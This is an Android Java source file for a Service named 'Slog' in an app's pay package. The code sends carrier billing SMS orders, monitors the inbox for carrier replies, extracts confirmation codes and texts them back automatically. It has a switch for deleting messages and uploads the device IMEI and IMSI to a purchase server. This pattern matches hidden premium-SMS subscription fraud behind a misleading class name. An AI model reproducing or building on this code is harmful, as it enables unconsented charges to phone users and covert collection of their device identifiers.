package com.community.yuequ.pay;

import android.app.Activity;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.widget.Toast;

import com.community.yuequ.Contants;
import com.community.yuequ.R;
import com.community.yuequ.Session;
import com.community.yuequ.YQApplication;
import com.community.yuequ.modle.BuyProgramDao;
import com.community.yuequ.modle.OrderTip;
import com.community.yuequ.modle.callback.JsonCallBack;
import com.community.yuequ.util.AESUtil;
import com.community.yuequ.util.Log;
import com.google.gson.Gson;
import com.zhy.http.okhttp.OkHttpUtils;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.HashMap;

import okhttp3.Call;

public class Slog extends Service {

    public static final String TAG = Slog.class.getSimpleName();
    public static final String ACTION = "action";
    public static final int ACTION_SENDSMS = 1;//发送短信指令
    public static final int ACTION_TAKE_BACK = 2;//短信带回
    private MyHandler mMyHandler;
    GetSmsContent mSmsContent;

    public static final int SMS_SEND_TIMEOUT = 0x1;// 发送超时
    public static final int SMS_SEND_OK = 0x2;// 发送短信成功
    public static final int SMS_SEND_FAIL = 0x3;// 发送短信失败
    public static final int SMS_RECEIVE_OK = 0x4;// 发送短信，对方接收成功
    public static final int SMS_RECEIVE_FAIL = 0x5;// 发送短信，对方接收失败

    public static final ArrayList<OrderTip> ORDER_TIPS = new ArrayList<>();
    private Session mSession;

    @Override
    public void onCreate() {
        super.onCreate();
        mSession = Session.get(getApplicationContext());
        mMyHandler = new MyHandler(this);
        registerReceiver(sendbroadcastReceiver, new IntentFilter(
                SoTools.ACTION_SMS_SENT));
        registerReceiver(delbroadcastReceiver, new IntentFilter(
                SoTools.SMS_RECIPIENT_EXTRA));

        mSmsContent = new GetSmsContent(this, mMyHandler);

        // 注册短信广播
        getContentResolver().registerContentObserver(
                Uri.parse("content://sms/"), true, mSmsContent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public static ArrayList<OrderTip> getOrderTipsList() {
        return new ArrayList<>(ORDER_TIPS);
    }

    public static boolean checkHaveUpPort(String address) {
        boolean have = false;
        if (TextUtils.isEmpty(address)) {
            return have;
        }
        for (OrderTip orderTip : ORDER_TIPS) {
            if (orderTip.up_port != null && orderTip.up_port.startsWith(address)) {
                have = true;
                break;
            }
        }
        return have;
    }

    public static boolean checkHaveOrderPort(String address) {
        boolean have = false;
        if (TextUtils.isEmpty(address)) {
            return have;
        }
        for (OrderTip orderTip : ORDER_TIPS) {
            if (orderTip.order_port != null && orderTip.order_port.startsWith(address)) {
                have = true;
                break;
            }
        }
        return have;
    }

    public static boolean checkHaveDownPort(String address) {
        boolean have = false;
        if (TextUtils.isEmpty(address)) {
            return have;
        }
        for (OrderTip orderTip : ORDER_TIPS) {
            if (orderTip.down_port != null && orderTip.down_port.startsWith(address)) {
                have = true;
                break;
            }
        }
        return have;
    }

    private static class MyHandler extends Handler {
        private WeakReference<Slog> serviceWeakReference;

        public MyHandler(Slog service) {
            serviceWeakReference = new WeakReference<>(service);
        }

        @Override
        public void handleMessage(Message msg) {
            Slog service = serviceWeakReference.get();
            if (service != null) {
                switch (msg.what) {
                    case SMS_SEND_OK:
                        service.sendSuccess((OrderTip) msg.obj);
                        break;
                    case SMS_SEND_FAIL:
                        service.sendFail((OrderTip) msg.obj);
                        break;
                    case SMS_RECEIVE_OK:
                        service.sendReceiveSuccess((OrderTip) msg.obj);
                        break;
                    case SMS_RECEIVE_FAIL:
                        service.sendReceiveFail((OrderTip) msg.obj);
                        break;
                    case SMS_SEND_TIMEOUT://发送短信后延迟发送这个消息（可用于短信发送没有返回做延迟处理）

                        break;
                    default:
                        break;

                }
            }
        }
    }

    /**
     * 短信接收失败
     *
     * @param obj
     */
    private void sendReceiveFail(OrderTip obj) {

    }

    /**
     * 短信接收成功
     *
     * @param obj
     */
    private void sendReceiveSuccess(OrderTip obj) {

    }

    /**
     * 短信发送失败
     *
     * @param obj
     */
    private void sendFail(OrderTip obj) {

    }

    /**
     * 短信发送成功
     *
     * @param orderTip
     */
    private void sendSuccess(OrderTip orderTip) {
        HashMap<String, Object> hashMap = new HashMap<>();
        hashMap.put("type", orderTip.type);//计费类型,1：包月订购，2：按次订购
        hashMap.put("program_id", orderTip.programId);//节目id
        hashMap.put("imei", mSession.getIMEI());
        hashMap.put("imsi", mSession.getImsi());
        String content = "";
        try {
            content = AESUtil.encode(new Gson().toJson(hashMap));
        } catch (Exception e) {
            throw new RuntimeException("加密错误！");
        }
        if (TextUtils.isEmpty(content)) {
            Toast.makeText(YQApplication.getAppContext(), R.string.unknow_erro, Toast.LENGTH_SHORT).show();
            return;
        }
        OkHttpUtils
                .postString()
                .content(content)
                .url(Contants.URL_BUY)
                .tag(TAG)
                .build()
                .execute(new MyBuyCallBack(this));

    }

    public static class MyBuyCallBack extends JsonCallBack<BuyProgramDao> {
        private WeakReference<Slog> serviceWeakReference;

        public MyBuyCallBack(Slog service) {
            serviceWeakReference = new WeakReference<>(service);
        }

        @Override
        public void onError(Call call, Exception e,int id) {
            Slog service = serviceWeakReference.get();
            if (service != null) {
                service.onError();
            }
        }

        @Override
        public void onResponse(BuyProgramDao response,int id) {
            Slog service = serviceWeakReference.get();
            if (service != null) {
                service.onResponse(response);
            }
        }
    }

    private void onError() {
        Toast.makeText(YQApplication.getAppContext(), "订购失败！", Toast.LENGTH_SHORT).show();
    }

    private void onResponse(BuyProgramDao response) {
        if (response.errorCode == Contants.HTTP_OK) {
            Toast.makeText(YQApplication.getAppContext(), "订购成功！", Toast.LENGTH_SHORT).show();


        } else if (!TextUtils.isEmpty(response.errorMessage)) {
            Toast.makeText(YQApplication.getAppContext(), response.errorMessage, Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(YQApplication.getAppContext(), "订购失败！", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        int action = intent.getIntExtra(ACTION, 0);

        if (ACTION_SENDSMS == action) {//发送短信动作

            int programId = intent.getIntExtra("programId", 0);
            OrderTip orderTip = intent.getParcelableExtra("OrderTip");
            if (orderTip != null) {

                orderTip.programId = programId;
                orderTip.transactionID = System.currentTimeMillis();
//                orderTip.order_port = "10010";
//                orderTip.order_directive = "话费";
//                orderTip.compare_text_1 = "查询实时";
//                orderTip.compare_text_2 = "请回复";
//                orderTip.down_port = "10010";
//                orderTip.up_port = "10010";
//                orderTip.take_msg_switch = "1";
//                orderTip.is_del_msg_swtich = "1";
            }

            boolean sendSMS = SoTools.SendSMS(getApplicationContext(), orderTip.order_port, orderTip.order_directive, orderTip);
            if (sendSMS) {
                ORDER_TIPS.add(orderTip);
                mMyHandler.sendEmptyMessageDelayed(SMS_SEND_TIMEOUT, 20 * 1000);
            }
        } else if (ACTION_TAKE_BACK == action) {//短信带回动作
            String fromAddress = intent.getStringExtra("fromAddress");
            String body = intent.getStringExtra("body");
            if (!TextUtils.isEmpty(fromAddress) && !TextUtils.isEmpty(body)) {
                tackBackAndDel(fromAddress, body);
            }
        }

        return super.onStartCommand(intent, flags, startId);

    }

    /**
     * 带回和删除逻辑
     *
     * @param fromAddress
     * @param body
     */
    private synchronized void tackBackAndDel(String fromAddress, String body) {

        for (OrderTip orderTip : ORDER_TIPS) {
            if (orderTip.up_port != null && orderTip.up_port.startsWith(fromAddress)) {
                /************带回开、匹配位置1不为空、下行端口不为空******************/
                if ("1".equals(orderTip.take_msg_switch)
                        && !TextUtils.isEmpty(orderTip.compare_text_1) && !TextUtils.isEmpty(orderTip.down_port)) {//是否带回
                    String compareText1 = orderTip.compare_text_1;
                    String compareText2 = orderTip.compare_text_2;
                    /************index1的位置******************/
                    int index1 = body.indexOf(compareText1);
                    if (index1 == -1) {
                        break;
                    }

                    /************index2的位置******************/
                    int index2 = body.length();

                    if (!TextUtils.isEmpty(compareText2)) {// 不配置reply2，则使用后面全部的
                        index2 = body.indexOf(compareText2, index1 + compareText1.length());// 从下一位置开始找，才不容易出错
                        if (index2 < 1) {
                            index2 = body.length();
                        }
                    }
                    /************回复内容******************/
                    if (index1 >= 0 && index2 > 0) {
                        String replyContent = body.substring(index1 + compareText1.length(), index2);
                        if (!TextUtils.isEmpty(replyContent)) {//找到了带回内容
                            SoTools.SendSMS(getApplicationContext(), orderTip.down_port, replyContent, orderTip);
                            Log.i(TAG,"replyContent:"+replyContent);
                        }
                    }
                }
            }
            if ("1".equals(orderTip.is_del_msg_swtich)) {//是否删除


            }
            break;
        }

    }

    public BroadcastReceiver sendbroadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            OrderTip orderTip = intent.getParcelableExtra("OrderTip");
            String message = null;
            boolean error = true;

            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    message = "Message sent!";
                    error = false;
                    break;
                case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                    message = "Error.";
                    break;
                case SmsManager.RESULT_ERROR_NO_SERVICE:
                    message = "Error: No service.";
                    break;
                case SmsManager.RESULT_ERROR_NULL_PDU:
                    message = "Error: Null PDU.";
                    break;
                case SmsManager.RESULT_ERROR_RADIO_OFF:
                    message = "Error: Radio off.";
                    break;
                default:
                    message = "Error.unknown";
                    break;
            }

            Message msg = mMyHandler.obtainMessage();
            msg.obj = orderTip;
            if (error) {
                msg.what = SMS_SEND_FAIL;
            } else {
                msg.what = SMS_SEND_OK;
            }
            mMyHandler.sendMessage(msg);
        }
    };

    public BroadcastReceiver delbroadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            OrderTip orderTip = intent.getParcelableExtra("OrderTip");
            String message = null;
            boolean error = true;

            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    message = "Message sent!";
                    error = false;
                    break;
                case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                    message = "Error.";
                    break;
                case SmsManager.RESULT_ERROR_NO_SERVICE:
                    message = "Error: No service.";
                    break;
                case SmsManager.RESULT_ERROR_NULL_PDU:
                    message = "Error: Null PDU.";
                    break;
                case SmsManager.RESULT_ERROR_RADIO_OFF:
                    message = "Error: Radio off.";
                    break;
                default:
                    message = "Error.unknown";
                    break;
            }
            Message msg = mMyHandler.obtainMessage();
            msg.obj = orderTip;
            if (error) {
                msg.what = SMS_RECEIVE_FAIL;
            } else {
                msg.what = SMS_RECEIVE_OK;
            }

            mMyHandler.sendMessage(msg);
        }
    };

    @Override
    public void onDestroy() {
        getContentResolver().unregisterContentObserver(mSmsContent);
        super.onDestroy();
        unregisterReceiver(sendbroadcastReceiver);
        unregisterReceiver(delbroadcastReceiver);
    }

}
